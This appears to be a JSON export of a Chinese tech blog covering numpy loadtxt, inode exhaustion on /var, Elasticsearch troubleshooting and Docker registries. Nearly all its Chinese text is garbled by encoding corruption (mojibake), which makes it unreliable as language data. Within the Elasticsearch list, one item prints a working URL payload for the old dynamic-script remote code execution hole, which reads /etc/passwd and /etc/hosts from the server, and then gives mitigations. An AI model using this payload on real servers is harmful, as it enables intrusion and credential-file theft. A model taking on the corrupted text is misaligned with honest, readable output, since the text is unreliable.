ä¸Šä¸­æ–‡æ³¨é‡Šå¾ˆé‡è¦ã€‚#coding=utf-8æˆ–è€…ï¼š#coding=gbk","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"Numpyä¸­ä½¿ç”¨loadtxtè·å–å•ä¸€åˆ—æ•°æ®æ—¶è®¾ç½®usecolså‚æ•°çš„æ–¹æ³•","slug":"history/tech/5953c4d0c2b92f5665eeda36","date":"2016-04-16T18:59:13.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda36/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda36/","excerpt":"","text":"loadtxtçš„åŠŸèƒ½æ˜¯è¯»å…¥æ•°æ®æ–‡ä»¶ï¼Œè¿™é‡Œçš„æ•°æ®æ–‡ä»¶è¦æ±‚æ¯ä¸€è¡Œæ•°æ®çš„æ ¼å¼ç›¸åŒã€‚è¿™ä¸ªå‡½æ•°æœ‰å‡ ä¸ªå¸¸ç”¨çš„å‚æ•°ï¼Œhttp://docs.scipy.org/doc/numpy/reference/generated/numpy.loadtxt.htmlç»™å‡ºäº†å‚æ•°çš„æ„ä¹‰ã€‚fnameï¼šè¯»å–æ–‡ä»¶çš„æ–‡ä»¶åã€‚ä¾‹å¦‚C:/Dataset/iris.txtã€‚delimiterï¼šæ•°æ®ä¹‹é—´çš„åˆ†éš”ç¬¦ã€‚å¦‚ä½¿ç”¨é€—å·&quot;,&quot;ã€‚dtypeï¼šæ•°æ®ç±»å‹ã€‚å¦‚floatï¼Œstrç­‰ã€‚usecolsï¼šé€‰å–æ•°æ®çš„åˆ—ã€‚è¿™é‡Œä¸»è¦è¯´ä¸€ä¸‹usecolsçš„ç”¨æ³•ã€‚å¦‚æœiris.txtä¸­çš„å‰4åˆ—ï¼Œåˆ™usecols=(0,1,2,3)ã€‚å¦‚æœå–ç¬¬5åˆ—è¿™ä¸€åˆ—ï¼Œåˆ™usecols=(4,)ã€‚è¿™ç§å–å•ä¸€åˆ—çš„æƒ…å†µå®¹æ˜“å‡ºé—®é¢˜ï¼Œè¯·å¤§å®¶å¤šæ³¨æ„ã€‚æ•´ä¸ªè¯­å¥å¦‚ä¸‹ï¼šloadtxt(â€œC:/Dataset/iris.txtâ€ , delimiter = â€œ,â€ , usecols=(0,1,2,3) , dtype=float)loadtxt(â€œC:/Dataset/iris.txtâ€ , delimiter = â€œ,â€ , usecols=(4,) , dtype=str)é¡¶0","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"No space left on device","slug":"history/tech/5953c4d0c2b92f5665eeda35","date":"2016-04-16T01:22:59.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda35/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda35/","excerpt":"","text":"ä»Šå¤©æƒ³è¦è®¾ç½®crontabæ—¶å‡ºç°ï¼ŒNo space left on deviceï¼Œåæ¥æŸ¥äº†ä¸‹ï¼Œæ‰çŸ¥é“æ˜¯å› ä¸ºinodeå·²ç»æ»¡äº†ï¼Œæ‰€ä»¥ç³»ç»Ÿæ— æ³•å†åˆ›å»ºæ–‡ä»¶åœ¨/var/spoo/clientmqueue/ä¸‹æœ‰è¶…å¤šçš„æ–‡ä»¶ ls åŠå¤©æ²¡ååº”ç”¨rm -rf * ä¼šè‡ªåŠ¨è·³å‡ºrootï¼Œç”¨xargsæ¥è§£å†³ã€‚# cd /var/spool/clientmqueue# ls | xargs rm -fåŸå› åˆ†æï¼šç³»ç»Ÿä¸­cronæ‰§è¡Œçš„ç¨‹åºæœ‰è¾“å‡ºå†…å®¹ï¼Œè¾“å‡ºå†…å®¹ä¼šä»¥é‚®ä»¶å½¢å¼å‘ç»™cronçš„ç”¨æˆ·ï¼Œè€Œsendmailæ²¡æœ‰å¯åŠ¨æ‰€ä»¥å°±äº§ç”Ÿäº†è¿™äº›æ–‡ä»¶ï¼›è§£å†³åŠæ³•: å°†crontabé‡Œé¢çš„å‘½ä»¤åé¢åŠ ä¸Š&gt; /dev/null 2&gt;&amp;1æ¥ä¸‹æ¥æˆ‘ä»ç½‘ä¸Šæ”¶é›†çš„ä¹Ÿç§¯ç´¯ä¸‹ï¼Œçœå¾—ä¸‹æ¬¡å†é‡åˆ°åˆ«çš„åˆæ‰¾ï¼Œå¦‚ä¸‹ï¼šæ•…éšœç°è±¡:1 when you create a new directory or file , system will say : No space left on device# mkdir aamkdir: cannot create directory aa': No space left on device 2 when create crontab for account shelladm , you will receive error information as follows: &quot;crontab.6655&quot; 1L, 13C writtencrontab: installing new crontabcron/tmp.6655: No space left on devicecrontab: edits left in /tmp/crontab.6655å¤„ç†æ­¥éª¤:1 æ£€æŸ¥åˆ†åŒºä½¿ç”¨ç‡# df -lk Filesystem 1K-blocks Used Available Use% Mounted on /dev/hda2 3020172 136008 2730744 5% / /dev/hda1 101089 9378 86492 10% /boot /dev/hda7 105708092 38996880 61341488 39% /b2006 none 1028548 0 1028548 0% /dev/shm /dev/hda3 3020172 1421092 1445660 50% /usr /dev/hda6 497829 371795 100332 79% /var åˆ†åŒº/varçš„ä½¿ç”¨ç‡åªæœ‰79%ï¼Œç³»ç»Ÿæœ‰ç©ºé—´å¯ä»¥ç”¨2 æ£€æŸ¥/var/lockä¸‹çš„æ–‡ä»¶ï¼Œåˆ é™¤/var/lock/subsys/nfsåï¼Œtouch /var/aaï¼ŒæˆåŠŸåˆ›å»ºæ–‡ä»¶ï¼Œåˆ é™¤/var/aa3 å‘ç°åˆ é™¤/var/lockä¸‹çš„ä»»æ„ä¸€ä¸ªæ–‡ä»¶å#touch /var/aa -------------------æˆåŠŸ# touch aa1 -------------------å¤±è´¥ touch: creatingaa1â€™: No space left on device4 å°†æ£€æŸ¥æ‰©å¤§åˆ°/varä¸‹çš„å…¶ä»–ç›®å½•ï¼Œ cd /var/www/icons mv a.gif /tmp mv a.png /tmp -------------------ç§»èµ°ä¸¤ä¸ªæ–‡ä»¶ df -li touch aa touch bb touch cctouch: creating `ccâ€™: No space left on device -----------åªèƒ½åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ï¼Œå½“åˆ›å»ºç¬¬ä¸‰ä¸ªæ–‡ä»¶æ—¶ï¼Œå‡ºé”™5 æ€€ç–‘åˆ†åŒº/varçš„inodeç”¨å°½å¯¼è‡´ä¸Šè¿°é—®é¢˜ï¼Œæ£€æŸ¥inodeä½¿ç”¨ç‡# df -liFilesystem Inodes IUsed IFree IUse% Mounted on/dev/hda2 384000 23698 360302 7% //dev/hda1 26104 41 26063 1% /boot/dev/hda7 13434880 7964 13426916 1% /b2006none 257137 1 257136 1% /dev/shm/dev/hda3 384000 78026 305974 21% /usr/dev/hda6 128520 128520 0 100% /varå‘ç°/varçš„inodeä½¿ç”¨ç‡å·²ç»è¾¾åˆ°100%ï¼Œç©ºä½™çš„inodeä¸º06 åˆ†åŒº/varæ²¡æœ‰é…ç½®quota ,å¹³å‡æ¯ä¸ªinodeçš„å ç”¨ç©ºé—´ä¸ºï¼š497829k(var size)/128520(inodes)=3.87kï¼Œè¯´æ˜åˆ†åŒºçš„æœ€å°blockä¸º4kï¼Œæ— æ³•å¢åŠ inodeé™é¢ã€‚7 å‘ç°/var/spool/clientmqueueä¸‹é¢æœ‰å¤ªå¤šçš„æ–‡ä»¶ï¼Œå…±æœ‰127679ä¸ªï¼Œå ç”¨äº†127679/128520(inodes)=99.3%çš„inodeç³»ç»Ÿçš„é‚®ä»¶é…ç½®æœ‰é—®é¢˜ï¼Œå¯¼è‡´ç³»ç»Ÿå‘å‡ºçš„é‚®ä»¶å †ç§¯åœ¨é˜Ÿåˆ—ä¸­ï¼Œå ç”¨çš„å¤§é‡çš„inode.å¤„ç†æ–¹æ³•ï¼šç¡®è®¤/var/spool/clientmqueueä¸‹çš„æ–‡ä»¶å·²ç»æ— ç”¨åï¼Œåˆ é™¤ä¹‹ã€‚ç„¶å/varå†™å…¥æ­£å¸¸ã€‚æœ€å¥½çš„è§£å†³åŠæ³•æ˜¯é‡æ–°è®¾ç½®ç³»ç»Ÿé‚®ä»¶ï¼Œä½¿å…¶èƒ½æ­£å¸¸å‘é€ã€‚åˆ é™¤æ–‡ä»¶åçš„inodeä½¿ç”¨æƒ…å†µ df -liFilesystem Inodes IUsed IFree IUse% Mounted on/dev/hda2 384000 23698 360302 7% //dev/hda1 26104 41 26063 1% /boot/dev/hda7 13434880 7964 13426916 1% /b2006none 257137 1 257136 1% /dev/shm/dev/hda3 384000 78026 305974 21% /usr/dev/hda6 128520 4561 123959 4% /varç»“è®ºï¼šåˆ†åŒº/varçš„inodeå…¨éƒ¨ç”¨å°½ï¼Œfree inodeä¸º0ï¼Œå¯¼è‡´æ— æ³•åˆ›å»ºæ–°çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œä»¥åé‡åˆ°ç±»ä¼¼çš„é—®é¢˜è¦æ³¨æ„ç”¨df -li æ£€æŸ¥inodeçš„ä½¿ç”¨æƒ…å†µã€‚################################################################################å½“å¯åŠ¨apacheçš„æ—¶å€™æŠ¥è¿™ç§é”™ï¼šNo space left on device: Couldnâ€™t create accept lockdf -h ä¸€ä¸‹å‘ç°ä¸æ˜¯ç£ç›˜ç©ºé—´çš„é—®é¢˜ï¼Œgoogleäº†ä¸€ä¸‹å‘ç°æ˜¯ç³»ç»Ÿçš„Semaphore Arraysä¸å¤Ÿç”¨äº†ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ‰€æœ‰çš„Semaphore Arraysï¼šipcs -s ç„¶åç”¨è¿™è¡Œå‘½ä»¤åˆ é™¤æ‰€æœ‰çš„Semaphore Arrayså³å¯ï¼šipcs -s | grep nobody | perl -lane 'print ipcrm sem $Fâ€™ ï¼ˆå…¶ä¸­nobodyè¡¨ç¤ºç”¨æˆ·åï¼‰","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"elasticsearch é‡åˆ°çš„ä¸€äº›é—®é¢˜","slug":"history/tech/5953c4d0c2b92f5665eeda34","date":"2016-04-16T01:19:31.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda34/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda34/","excerpt":"","text":"1.ç”±gcå¼•èµ·èŠ‚ç‚¹è„±ç¦»é›†ç¾¤å› ä¸ºgcæ—¶ä¼šä½¿jvmåœæ­¢å·¥ä½œï¼Œå¦‚æœæŸä¸ªèŠ‚ç‚¹gcæ—¶é—´è¿‡é•¿ï¼Œmaster ping3æ¬¡ï¼ˆzen discoveryé»˜è®¤pingå¤±è´¥é‡è¯•3æ¬¡ï¼‰ä¸é€šåå°±ä¼šæŠŠè¯¥èŠ‚ç‚¹å‰”é™¤å‡ºé›†ç¾¤ï¼Œä»è€Œå¯¼è‡´ç´¢å¼•è¿›è¡Œé‡æ–°åˆ†é…ã€‚è§£å†³æ–¹æ³•ï¼šï¼ˆ1ï¼‰ä¼˜åŒ–gcï¼Œå‡å°‘gcæ—¶é—´ã€‚ï¼ˆ2ï¼‰è°ƒå¤§zen discoveryçš„é‡è¯•æ¬¡æ•°ï¼ˆeså‚æ•°ï¼šping_retriesï¼‰å’Œè¶…æ—¶æ—¶é—´ï¼ˆeså‚æ•°ï¼šping_timeoutï¼‰ã€‚åæ¥å‘ç°æ ¹æœ¬åŸå› æ˜¯æœ‰ä¸ªèŠ‚ç‚¹çš„ç³»ç»Ÿæ‰€åœ¨ç¡¬ç›˜æ»¡äº†ã€‚å¯¼è‡´ç³»ç»Ÿæ€§èƒ½ä¸‹é™ã€‚2.out of memoryé”™è¯¯å› ä¸ºé»˜è®¤æƒ…å†µä¸‹eså¯¹å­—æ®µæ•°æ®ç¼“å­˜ï¼ˆField Data Cacheï¼‰å¤§å°æ˜¯æ— é™åˆ¶çš„ï¼ŒæŸ¥è¯¢æ—¶ä¼šæŠŠå­—æ®µå€¼æ”¾åˆ°å†…å­˜ï¼Œç‰¹åˆ«æ˜¯facetæŸ¥è¯¢ï¼Œå¯¹å†…å­˜è¦æ±‚éå¸¸é«˜ï¼Œå®ƒä¼šæŠŠç»“æœéƒ½æ”¾åœ¨å†…å­˜ï¼Œç„¶åè¿›è¡Œæ’åºç­‰æ“ä½œï¼Œä¸€ç›´ä½¿ç”¨å†…å­˜ï¼Œç›´åˆ°å†…å­˜ç”¨å®Œï¼Œå½“å†…å­˜ä¸å¤Ÿç”¨æ—¶å°±æœ‰å¯èƒ½å‡ºç°out of memoryé”™è¯¯ã€‚è§£å†³æ–¹æ³•ï¼šï¼ˆ1ï¼‰è®¾ç½®esçš„ç¼“å­˜ç±»å‹ä¸ºSoft Referenceï¼Œå®ƒçš„ä¸»è¦ç‰¹ç‚¹æ˜¯æ®æœ‰è¾ƒå¼ºçš„å¼•ç”¨åŠŸèƒ½ã€‚åªæœ‰å½“å†…å­˜ä¸å¤Ÿçš„æ—¶å€™ï¼Œæ‰è¿›è¡Œå›æ”¶è¿™ç±»å†…å­˜ï¼Œå› æ­¤åœ¨å†…å­˜è¶³å¤Ÿçš„æ—¶å€™ï¼Œå®ƒä»¬é€šå¸¸ä¸è¢«å›æ”¶ã€‚å¦å¤–ï¼Œè¿™äº›å¼• ç”¨å¯¹è±¡è¿˜èƒ½ä¿è¯åœ¨JavaæŠ›å‡ºOutOfMemory å¼‚å¸¸ä¹‹å‰ï¼Œè¢«è®¾ç½®ä¸ºnullã€‚å®ƒå¯ä»¥ç”¨äºå®ç°ä¸€äº›å¸¸ç”¨å›¾ç‰‡çš„ç¼“å­˜ï¼Œå®ç°Cacheçš„åŠŸèƒ½ï¼Œä¿è¯æœ€å¤§é™åº¦çš„ä½¿ç”¨å†…å­˜è€Œä¸å¼•èµ·OutOfMemoryã€‚åœ¨esçš„é…ç½®æ–‡ä»¶åŠ ä¸Šindex.cache.field.type: softå³å¯ã€‚ï¼ˆ2ï¼‰è®¾ç½®esæœ€å¤§ç¼“å­˜æ•°æ®æ¡æ•°å’Œç¼“å­˜å¤±æ•ˆæ—¶é—´ï¼Œé€šè¿‡è®¾ç½®index.cache.field.max_size: 50000æ¥æŠŠç¼“å­˜fieldçš„æœ€å¤§å€¼è®¾ç½®ä¸º50000ï¼Œè®¾ç½®index.cache.field.expire: 10mæŠŠè¿‡æœŸæ—¶é—´è®¾ç½®æˆ10åˆ†é’Ÿã€‚3.æ— æ³•åˆ›å»ºæœ¬åœ°çº¿ç¨‹é—®é¢˜esæ¢å¤æ—¶æŠ¥é”™ï¼š RecoverFilesRecoveryException[ Failed to transfer files with total size of ]; nested: OutOfMemoryError; ]]åˆšå¼€å§‹ä»¥ä¸ºæ˜¯æ–‡ä»¶å¥æŸ„æ•°é™åˆ¶ï¼Œä½†æƒ³åˆ°ä¹‹å‰æŠ¥çš„æ˜¯too many open fileè¿™ä¸ªé”™è¯¯ï¼Œå¹¶ä¸”ä¹ŸæŠŠæ•°æ®æ”¹å¤§äº†ã€‚æŸ¥èµ„æ–™å¾—çŸ¥ä¸€ä¸ªè¿›ç¨‹çš„jvmè¿›ç¨‹çš„æœ€å¤§çº¿ç¨‹æ•°ä¸ºï¼šè™šæ‹Ÿå†…å­˜/ï¼ˆå †æ ˆå¤§å°10241024ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´è™šæ‹Ÿå†…å­˜è¶Šå¤§æˆ–å †æ ˆè¶Šå°ï¼Œèƒ½åˆ›å»ºçš„çº¿ç¨‹è¶Šå¤šã€‚é‡æ–°è®¾ç½®åè¿˜æ˜¯ä¼šæŠ¥é‚£è¿™é”™ï¼ŒæŒ‰ç†è¯´å¯åˆ›å»ºçº¿ç¨‹æ•°å®Œå…¨å¤Ÿç”¨äº†çš„ï¼Œå°±æƒ³æ˜¯ä¸æ˜¯ç³»ç»Ÿçš„ä¸€äº›é™åˆ¶ã€‚åæ¥åœ¨ç½‘ä¸Šæ‰¾åˆ°è¯´æ˜¯max user processesçš„é—®é¢˜ï¼Œè¿™ä¸ªå€¼é»˜è®¤æ˜¯1024ï¼Œè¿™ä¸ªå‚æ•°å•çœ‹åå­—æ˜¯ç”¨æˆ·æœ€å¤§æ‰“å¼€çš„è¿›ç¨‹æ•°ï¼Œä½†çœ‹å®˜æ–¹è¯´æ˜ï¼Œå°±æ˜¯ç”¨æˆ·æœ€å¤šå¯åˆ›å»ºçº¿ç¨‹æ•°ï¼Œå› ä¸ºä¸€ä¸ªè¿›ç¨‹æœ€å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œæ‰€ä»¥é—´æ¥å½±å“åˆ°æœ€å¤§è¿›ç¨‹æ•°ã€‚è°ƒå¤§è¿™ä¸ªå‚æ•°åå°±æ²¡æœ‰æŠ¥è¿™ä¸ªé”™äº†ã€‚è§£å†³æ–¹æ³•ï¼šï¼ˆ1ï¼‰å¢å¤§jvmçš„heapå†…å­˜æˆ–é™ä½xsså †æ ˆå¤§å°ï¼ˆé»˜è®¤çš„æ˜¯512Kï¼‰ã€‚ï¼ˆ2ï¼‰æ‰“å¼€/etc/security/limits.conf ï¼ŒæŠŠsoft nproc 1024è¿™è¡Œçš„1024æ”¹å¤§å°±è¡Œäº†ã€‚4.é›†ç¾¤çŠ¶æ€ä¸ºé»„è‰²æ—¶å¹¶å‘æ’å…¥æ•°æ®æŠ¥é”™: index , type , id , message [UnavailableShardsException[ shardIt, active : Timeout waiting for , request: org.elasticsearch.action.bulk.BulkShardRequest@5989fa07]]è¿™æ˜¯é”™è¯¯ä¿¡æ¯ï¼Œå½“æ—¶é›†ç¾¤çŠ¶æ€ä¸ºé»„è‰²ï¼Œå³å‰¯æœ¬æ²¡æœ‰åˆ†é…ã€‚å½“æ—¶å‰¯æœ¬è®¾ç½®ä¸º2ï¼Œåªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå½“ä½ è®¾ç½®çš„å‰¯æœ¬å¤§äºå¯åˆ†é…çš„æœºå™¨æ—¶ï¼Œæ­¤æ—¶å¦‚æœä½ æ’å…¥æ•°æ®å°±æœ‰å¯èƒ½æŠ¥ä¸Šé¢çš„é”™ï¼Œå› ä¸ºesçš„å†™ä¸€è‡´æ€§é»˜è®¤æ˜¯ä½¿ç”¨quorumï¼Œå³quorumå€¼å¿…é¡»å¤§äºï¼ˆå‰¯æœ¬æ•°/2+1ï¼‰ï¼Œæˆ‘è¿™é‡Œ2/2+1=2ä¹Ÿå°±æ˜¯è¯´è¦è¦è‡³å°‘æ’å…¥åˆ°ä¸¤ä»½ç´¢å¼•ä¸­ï¼Œç”±äºåªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œquorumç­‰äº1ï¼Œæ‰€ä»¥åªæ’å…¥åˆ°ä¸»ç´¢å¼•ï¼Œå‰¯æœ¬æ‰¾ä¸åˆ°ä»è€ŒæŠ¥ä¸Šé¢é‚£ä¸ªé”™ã€‚è§£å†³æ–¹æ³•ï¼šï¼ˆ1ï¼‰å»æ‰æ²¡åˆ†é…çš„å‰¯æœ¬ã€‚ï¼ˆ2ï¼‰æŠŠå†™ä¸€è‡´æ€§æ”¹æˆoneï¼Œå³åªå†™å…¥ä¸€ä»½ç´¢å¼•å°±è¡Œã€‚5.è®¾ç½®jvmé”ä½å†…å­˜æ—¶å¯åŠ¨è­¦å‘Šå½“è®¾ç½®bootstrap.mlockall: trueæ—¶ï¼Œå¯åŠ¨esæŠ¥è­¦å‘ŠUnknown mlockall error 0ï¼Œå› ä¸ºlinuxç³»ç»Ÿé»˜è®¤èƒ½è®©è¿›ç¨‹é”ä½çš„å†…å­˜ä¸º45kã€‚è§£å†³æ–¹æ³•ï¼šè®¾ç½®ä¸ºæ— é™åˆ¶ï¼Œlinuxå‘½ä»¤ï¼šulimit -l unlimited6.é”™è¯¯ä½¿ç”¨apiå¯¼è‡´é›†ç¾¤å¡æ­»å…¶å®è¿™ä¸ªæ˜¯å¾ˆä½çº§çš„é”™è¯¯ã€‚åŠŸèƒ½å°±æ˜¯æ›´æ–°ä¸€äº›æ•°æ®ï¼Œå¯èƒ½ä¼šå¯¹ä¸€äº›æ•°æ®è¿›è¡Œåˆ é™¤ï¼Œä½†åˆ é™¤æ—¶åŒäº‹ä½¿ç”¨äº†deleteByQueryè¿™ä¸ªæ¥å£ï¼Œé€šè¿‡æ„é€ BoolQueryæŠŠè¦åˆ é™¤æ•°æ®çš„idä¼ è¿›å»ï¼ŒæŸ¥å‡ºè¿™äº›æ•°æ®åˆ é™¤ã€‚ä½†é—®é¢˜æ˜¯BoolQueryæœ€å¤šåªæ”¯æŒ1024ä¸ªæ¡ä»¶ï¼Œ100ä¸ªæ¡ä»¶éƒ½å·²ç»å¾ˆå¤šäº†ï¼Œæ‰€ä»¥è¿™æ ·çš„æŸ¥è¯¢ä¸€ä¸‹å­å°±æŠŠesé›†ç¾¤å¡æ­»äº†ã€‚è§£å†³æ–¹æ³•ï¼šç”¨bulkRequestè¿›è¡Œæ‰¹é‡åˆ é™¤æ“ä½œã€‚7.org.elasticsearch.transport.RemoteTransportException: Failed to deserialize exception response from streamåŸå› :esèŠ‚ç‚¹ä¹‹é—´çš„JDKç‰ˆæœ¬ä¸ä¸€æ ·è§£å†³æ–¹æ³•ï¼šç»Ÿä¸€JDKç¯å¢ƒ8 **. org.elasticsearch.client.transport.NoNodeAvailableException: No node available**1ï¼‰ ç«¯å£é”™client = new TransportClient().addTransportAddress(new InetSocketTransportAddress(ipAddress, 9300));è¿™é‡Œ9300 å†™æˆ9200çš„è¯ä¼šNo node availableè¦æ˜¯ä½ è¿çš„ä¸æ˜¯æœ¬æœºï¼Œæ³¨æ„IPæœ‰æ²¡æœ‰æ­£ç¡®2 ï¼‰jaræŠ¥å¼•ç”¨ç‰ˆæœ¬ä¸åŒ¹é…ï¼Œå¼€å¯çš„æœåŠ¡æ˜¯ä»€ä¹ˆç‰ˆæœ¬ï¼Œå¼•ç”¨çš„jaræœ€å¥½åŒ¹é…ï¼ˆè¿™ä¸ªæˆ‘æ²¡æœ‰å»è¯•ï¼Œåæ­£æˆ‘çš„æ˜¯åŒ¹é…çš„ï¼‰3ï¼‰ è¦æ˜¯ä½ æ”¹äº†é›†ç¾¤åå­—ï¼Œè¿˜æœ‰è®¾ç½®é›†ç¾¤åå­—Settings settings = ImmutableSettings.settingsBuilder().put(â€œcluster.nameâ€, â€œxxxâ€).build(); client = new TransportClient(settings).addTransportAddress(new InetSocketTransportAddress(ipAddress, 9300));4ï¼‰é›†ç¾¤è¶…è¿‡5sæ²¡æœ‰å“åº”è§£å†³æ–¹æ³•1.è®¾ç½®client.transport.ping_timeoutè®¾å¤§2.ä»£ç å†…åŠ å…¥while (true) {try {bulk.execute().actionGet(getRetryTimeout());break;}catch (NoNodeAvailableException cont) {Thread.sleep(5000);continue;}}9.elasticsearchè¿‘æ—¥è¢«å‘ç°æ¼æ´ï¼Œå¯ä»¥è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ï¼Œç”±äº elasticsearchæä¾›äº†httpæ¥å£ï¼Œå¯¼è‡´å¯èƒ½é€šè¿‡CSRFç­‰æ–¹å¼å€ŸåŠ©æ¶æ„é¡µé¢æµè§ˆå‘ç”Ÿæ”»å‡»ã€‚æ¼æ´å½±å“ç‰ˆæœ¬:elasticsearch 1.2ä»¥ä¸‹æµ‹è¯•ä»£ç ï¼šhttp:// ESSERVERIP:9200/search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22%2Fetc%2Fhosts%22%3A%7B%22script%22%3A%22import%20java.util.%3B%5Cnimport%20java.io.%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fhosts%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%2C%22%2Fetc%2Fpasswd%22%3A%7B%22script%22%3A%22import%20java.util.%3B%5Cnimport%20java.io.%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D&amp;callback=jQuery111102863897154977554_1400571156308&amp;=1400571156309æµè§ˆå™¨ä¼šè¿”å›/etc/passwdå†…å®¹è§£å†³æ–¹æ¡ˆï¼š1ã€åœ¨é…ç½®æ–‡ä»¶elasticsearch.ymlé‡Œè®¾ç½®script.disable_dynamic: true2ã€ä¸¥æ ¼é™åˆ¶å¯è®¿é—®elasticsearchæœåŠ¡çš„IPåœ°å€**å‚è€ƒï¼š**http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html#_disabling_dynamic_scriptsé‡å¯åæŠ¥503é”™è¯¯è¯¦æƒ…å¦‚æ­¤ä¸‹ï¼š Message not fully read (request) for andaction , resetting failed to send join request to master [[UG2WbJpDTHOB-EjzJFRsow][inet]], reason [org.elasticsearch.transport.RemoteTransportException:[inet]; org.elasticsearch.transport.RemoteTransportException: [inet]; org.elasticsearch.ElasticsearchIllegalArgumentException: No custom index metadata factory registered for type ]é—®é¢˜åŸå› ï¼šéƒ½é‡‡ç”¨é»˜è®¤é›†ç¾¤åå­—çš„è¯ï¼Œä¸åŒäººä¸åŒIé…ç½®å‘åˆ°é›†ç¾¤ä¼šè¿›è¡Œè¿æ¥å¹¶é€‰Masterï¼Œæœ‰æ—¶å€™å¯èƒ½å› ä¸ºIPé™åˆ¶è¿æ¥ä¸ä¸Šã€‚æ›´æ”¹ï¼šè‡ªå·±çš„æµ‹è¯•æœåŠ¡å°½é‡ä¸ªæ€§å‘½åå‚è€ƒæ–‡çŒ®ï¼š http://blog.csdn.net/laigood/article/details/8193170from http://blog.csdn.net/july_2/article/details/24728733","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"æ­å»ºdockerä»“åº“2","slug":"history/tech/5953c4d0c2b92f5665eeda33","date":"2016-04-13T18:56:26.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda33/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda33/","excerpt":"","text":"https://hub.docker.com/ æ˜¯ Docker å®˜æ–¹çš„å…¬å…±ä»“åº“æœåŠ¡å™¨ï¼Œç”¨æˆ·åœ¨ DockerHub ä¸Šåªèƒ½åˆ›å»ºä¸€ä¸ªç§æœ‰ä»“åº“ï¼Œè¿™å¯¹äºæœ‰äº›ç”¨æˆ·æ˜¯ä¸å¤Ÿç”¨çš„ï¼Œè€Œä¸” DockerHub æœåŠ¡å™¨çš„è®¿é—®é€Ÿåº¦ä¹Ÿæ˜¯ä¸ªå¾ˆå¤§é—®é¢˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¸Œæœ›èƒ½åœ¨è‡ªå·±æœ¬åœ°çš„æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªç±»ä¼¼äº DockerHub ä»“åº“æœåŠ¡å™¨ä¾›å›¢é˜Ÿä½¿ç”¨ï¼Œè¿™ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚æˆ‘æµ‹è¯•çš„ç¯å¢ƒæ˜¯ Mac OSX ä¸‹ï¼Œå·²ç»é€šè¿‡ Boot2Docker å·¥å…·å®‰è£…å¥½ Docker çš„ç¯å¢ƒï¼Œé€šè¿‡ å‘½ä»¤boot2docker ip å¯ä»¥æŸ¥çœ‹è™šæ‹Ÿæœºçš„ IP æ˜¯ 192.168.59.104ã€‚é‚£ä¹ˆä¸‹é¢æˆ‘å°±åœ¨è‡ªå·±è™šæ‹Ÿæœºä¸Šæ­å»ºä¸€ä¸ªç§æœ‰çš„ Docker 